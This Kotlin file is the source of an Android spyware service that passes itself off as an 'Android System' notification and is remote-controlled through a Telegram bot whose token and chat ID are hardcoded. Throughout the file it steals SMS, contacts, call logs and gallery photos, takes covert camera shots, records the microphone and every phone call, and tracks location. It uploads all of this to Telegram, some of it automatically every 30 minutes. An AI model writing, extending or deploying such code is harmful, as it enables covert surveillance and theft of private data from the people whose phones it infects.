package com.luffa

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit


class MyService : Service() {

    // Telegram Bot credentials - CHANGE THESE
    private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
    private val CHAT_ID = "8820979221"

    private var lastUpdateId = 0L
    private lateinit var pollingJob: Job
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildForegroundNotification())
        startBotPolling()
        scheduleAutoTasks() // 30‑min SMS & location
initCallRecording()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    
    override fun onDestroy() {
    super.onDestroy()
    unregisterReceiver(voipCallReceiver)
    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    if (isRecording) {
        mediaRecorder?.apply { stop(); release() }
    }
}
    
    
    
    
    override fun onBind(intent: Intent?) = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "spy_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Required system component"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("Android System")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build()
    }

    // ===== Telegram Bot Polling =====
    private fun startBotPolling() {
        pollingJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val response = client.newCall(Request.Builder().url(url).build()).execute()
                    val json = response.body?.string() ?: continue
                    val result = JSONObject(json).getJSONArray("result")
                    for (i in 0 until result.length()) {
                        val msg = result.getJSONObject(i).getJSONObject("message")
                        val updateId = result.getJSONObject(i).getLong("update_id")
                        lastUpdateId = updateId
                        val text = msg.optString("text", "")
                        val fromId = msg.getJSONObject("from").getLong("id")
                        // Only respond to commands from YOUR user ID
                        if (fromId == CHAT_ID.toLong() && text.isNotBlank()) {
                            handleCommand(text)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("SpyBot", "Poll error", e)
                    delay(2000)
                }
                delay(500) // small gap between polls
            }
        }
    }

    private fun handleCommand(cmd: String) {
        val lcmd = cmd.trim().lowercase()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                when {
                    lcmd == "sms" -> uploadLastSms(20)
                    lcmd.startsWith("photo") -> handlePhotoCommand(cmd)
                    lcmd == "contact" -> uploadContacts(50)
                    lcmd == "calllog" -> uploadCallLog(30)
                    lcmd == "frontcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT)
                    lcmd == "backcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)
                    lcmd == "audiorecord" -> recordAudio(120)
                    lcmd == "screen record" -> recordScreen(60) // needs user interaction, tricky
                    lcmd == "location" -> sendLiveLocation()
                    lcmd == "screenshot" -> takeScreenshot()
                    else -> sendTelegramMessage("Unknown command: $cmd")
                }
            } catch (e: Exception) {
                sendTelegramMessage("Error: ${e.message}")
            }
        }
    }

    // ===== Command Implementations =====

    private suspend fun uploadLastSms(count: Int) {
        val cursor = contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC")
        cursor?.use {
            val colBody = it.getColumnIndex("body")
            val colAddr = it.getColumnIndex("address")
            val colDate = it.getColumnIndex("date")
            var i = 0
            val sb = StringBuilder("Last ${count} SMS:\n")
            while (it.moveToNext() && i < count) {
                sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private suspend fun handlePhotoCommand(cmd: String) {
        val parts = cmd.removePrefix("photo").trim()
        val range = if (parts.isEmpty()) "1-10" else parts.replace(" ", "")
        // Fetch all image paths from gallery
        val images = getAllGalleryImages()
        if (images.isEmpty()) {
            sendTelegramMessage("No photos found.")
            return
        }
        // Parse range like "5", "6-10", "6 10"
        val indices = parseRange(range, images.size)
        for (idx in indices) {
            val file = File(images[idx])
            if (file.exists()) {
                sendTelegramPhoto(file)
            }
        }
    }

    private suspend fun uploadContacts(limit: Int) {
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val sb = StringBuilder("Contacts:\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name: $number\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private suspend fun uploadCallLog(limit: Int) {
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC")
        cursor?.use {
            val sb = StringBuilder("Call Log:\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
                val typeStr = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    else -> "MISSED"
                }
                sb.append("$typeStr $number ${formatDate(date)} ${duration}s\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private fun takeCameraPhoto(facing: Int) {
        val cameraId = findCameraId(facing) ?: return
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireNextImage()
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                    file.writeBytes(bytes)
                    sendTelegramPhoto(file)
                }
            }, Handler(Looper.getMainLooper()))

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(imageReader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }
                    device.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(request.build(), null, null)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {}
                    }, Handler(Looper.getMainLooper()))
                }
                override fun onDisconnected(device: CameraDevice) { device.close() }
                override fun onError(device: CameraDevice, error: Int) { device.close() }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            sendError("Camera failed: ${e.message}")
        }
    }

    private fun recordAudio(durationSec: Int) {
        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            val path = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3").absolutePath
            setOutputFile(path)
            try {
                prepare()
                start()
                Handler(Looper.getMainLooper()).postDelayed({
                    stop()
                    release()
                    CoroutineScope(Dispatchers.IO).launch {
                        sendTelegramDocument(File(path))
                    }
                }, durationSec * 1000L)
            } catch (e: Exception) {
                release()
                sendError("Audio record error: ${e.message}")
            }
        }
    }

    private fun recordScreen(durationSec: Int) {
        // Needs MediaProjection – system dialog will appear! User will see it.
        sendTelegramMessage("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
        // Implementation omitted because it's impossible to hide completely.
    }

    private suspend fun sendLiveLocation() {
        val location = getLastLocation()
        if (location != null) {
            val lat = location.latitude
            val lon = location.longitude
            sendTelegramLocation(lat, lon)
        } else {
            sendTelegramMessage("Location unavailable")
        }
    }

    private fun takeScreenshot() {
        // Use accessibility service to capture screen
        val service = MyAccessibilityService.instance ?: return
        service.takeScreenshot(android.graphics.Rect(0,0,1080,1920))
    }

    // ===== Auto tasks (every 30 min) =====
    private fun scheduleAutoTasks() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val smsWork = PeriodicWorkRequestBuilder<AutoSmsWorker>(30, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        val locWork = PeriodicWorkRequestBuilder<AutoLocationWorker>(30, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoSMS", ExistingPeriodicWorkPolicy.KEEP, smsWork)
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoLoc", ExistingPeriodicWorkPolicy.KEEP, locWork)
    }

    // ===== Utilities =====
    private fun getAllGalleryImages(): List<String> {
        val list = mutableListOf<String>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA)
        contentResolver.query(uri, projection, null, null, "date_added DESC")?.use { cursor ->
            val colData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            while (cursor.moveToNext()) {
                list.add(cursor.getString(colData))
            }
        }
        return list
    }
// ===== CALL RECORDING ADDITIONS =====
private var isRecording = false
private var mediaRecorder: MediaRecorder? = null
private var currentRecordingFile: File? = null
private lateinit var telephonyManager: TelephonyManager
private val phoneStateListener = object : PhoneStateListener() {
    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
        super.onCallStateChanged(state, phoneNumber)
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                // Cellular call started
                startCallRecording()
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                // Cellular call ended
                stopAndUploadRecording()
            }
        }
    }
}

// VoIP call detection via AccessibilityService broadcasts
private val voipCallReceiver = object : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == "com.evilbot.spy.VOIP_CALL_START") {
            startCallRecording()
        } else if (intent?.action == "com.evilbot.spy.VOIP_CALL_END") {
            stopAndUploadRecording()
        }
    }
}

// Init telephony & receiver in onCreate() – add this inside onCreate() after existing code:
private fun initCallRecording() {
    telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)

    // Register VoIP broadcast receiver
    val filter = IntentFilter().apply {
        addAction("com.evilbot.spy.VOIP_CALL_START")
        addAction("com.evilbot.spy.VOIP_CALL_END")
    }
    registerReceiver(voipCallReceiver, filter, Context.RECEIVER_NOT_EXPORTED)  // non-exported for security
}

private fun startCallRecording() {
    if (isRecording) return
    try {
        currentRecordingFile = File(cacheDir, "call_${System.currentTimeMillis()}.mp3")
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)  // change to VOICE_CALL if you have system permission (not recommended)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            setOutputFile(currentRecordingFile!!.absolutePath)
            prepare()
            start()
        }
        isRecording = true
        Log.d("CallRec", "Recording started")
    } catch (e: Exception) {
        Log.e("CallRec", "Start failed", e)
    }
}

private fun stopAndUploadRecording() {
    if (!isRecording) return
    try {
        mediaRecorder?.apply {
            stop()
            release()
        }
        mediaRecorder = null
        isRecording = false
        val file = currentRecordingFile ?: return
        CoroutineScope(Dispatchers.IO).launch {
            sendTelegramDocument(file)
            // Optionally delete after upload
            file.delete()
        }
    } catch (e: Exception) {
        Log.e("CallRec", "Stop failed", e)
    }
}
    
    
    
    
    
    private fun parseRange(raw: String, max: Int): List<Int> {
        val result = mutableListOf<Int>()
        if (raw.contains("-")) {
            val parts = raw.split("-")
            val start = parts[0].toIntOrNull() ?: 1
            val end = parts.getOrNull(1)?.toIntOrNull() ?: start
            for (i in start..end) {
                if (i in 1..max) result.add(i-1)
            }
        } else {
            raw.toIntOrNull()?.let { if (it in 1..max) result.add(it-1) }
        }
        if (result.isEmpty()) result.addAll(0 until minOf(10, max))
        return result
    }

    private fun findCameraId(facing: Int): String? {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (lensFacing == facing) return id
            }
        } catch (e: Exception) {}
        return null
    }

    private fun getLastLocation(): android.location.Location? {
        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        try {
            return lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
        } catch (e: Exception) {
            return null
        }
    }

    private fun formatDate(millis: Long): String =
        SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(millis))

    // ===== Telegram API sending helpers (in BotUtils.kt) =====
    // They are defined below in same file for simplicity:
    private suspend fun sendTelegramMessage(text: String) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val form = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", text)
            .build()
        client.newCall(Request.Builder().url(url).post(form).build()).execute()
    }

    private suspend fun sendTelegramPhoto(file: File) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
            .build()
        client.newCall(Request.Builder().url(url).post(body).build()).execute()
    }

    private suspend fun sendTelegramDocument(file: File) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
            .build()
        client.newCall(Request.Builder().url(url).post(body).build()).execute()
    }

    private suspend fun sendTelegramLocation(lat: Double, lon: Double) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendLocation"
        val form = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("latitude", lat.toString())
            .add("longitude", lon.toString())
            .build()
        client.newCall(Request.Builder().url(url).post(form).build()).execute()
    }

    private suspend fun sendError(msg: String) {
        sendTelegramMessage("Error: $msg")
    }

    // Worker classes for auto tasks (inline)
    class AutoSmsWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {
        override suspend fun doWork(): Result {
            val service = (applicationContext as? Context) ?: return Result.failure()
            // we need access to the service's uploadLastSms; easiest is to start service and send a message
            // For simplicity, we directly query and send SMS via raw API without service instance
            try {
                val cursor = applicationContext.contentResolver.query(
                    Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC limit 5"
                )
                val sb = StringBuilder("Auto SMS:\n")
                cursor?.use {
                    val colBody = it.getColumnIndex("body")
                    val colAddr = it.getColumnIndex("address")
                    while (it.moveToNext()) {
                        sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
                    }
                }
                val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
                val chatId = "8820979221"
                val okHttpClient = OkHttpClient()
                val form = FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", sb.toString())
                    .build()
                okHttpClient.newCall(Request.Builder().url("https://api.telegram.org/bot$token/sendMessage").post(form).build()).execute()
            } catch (e: Exception) {}
            return Result.success()
        }
    }

    class AutoLocationWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {
        override suspend fun doWork(): Result {
            val lm = applicationContext.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                ?: return Result.failure()
            val okHttpClient = OkHttpClient()
            val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
            val chatId = "8820979221"
            val form = FormBody.Builder()
                .add("chat_id", chatId)
                .add("latitude", loc.latitude.toString())
                .add("longitude", loc.longitude.toString())
                .build()
            okHttpClient.newCall(Request.Builder().url("https://api.telegram.org/bot$token/sendLocation").post(form).build()).execute()
            return Result.success()
        }
    }
}
